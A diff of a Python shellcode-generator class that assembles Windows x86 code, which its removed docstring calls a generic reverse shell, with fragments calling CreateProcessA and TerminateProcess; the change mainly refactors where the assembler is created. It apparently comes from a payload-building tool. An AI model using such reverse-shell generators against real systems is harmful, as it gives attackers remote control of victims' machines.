@@ -57,7 +57,6 @@ class Shellcode():
 
         self.arg_list = arg_object["positional arguments"]
         arg_object["architecture"] = Shellcode.arch
-        self.builder = Assembler(Shellcode.arch)
 
         self.dependencies = {
             "Kernel32.dll": [
@@ -402,10 +401,8 @@ call_CreateProccessA:
 call_TerminateProcess:
     xor ecx, ecx
     push ecx
-
     dec ecx
     push ecx    
-
     mov eax, [ebp - {self.storage_offsets['TerminateProcess']}]
     call eax
 """
@@ -413,7 +410,11 @@ call_TerminateProcess:
         return shellcode
 
     def get_shellcode(self):
-        """Generates Windows (x86) generic reverse shell
+        """Generates Shellcode
         """
 
-        return self.builder.get_bytes_from_asm(self.generate_source())
+        generator = Assembler(Shellcode.arch)
+
+        src = self.generate_source()
+
+        return generator.get_bytes_from_asm(src)
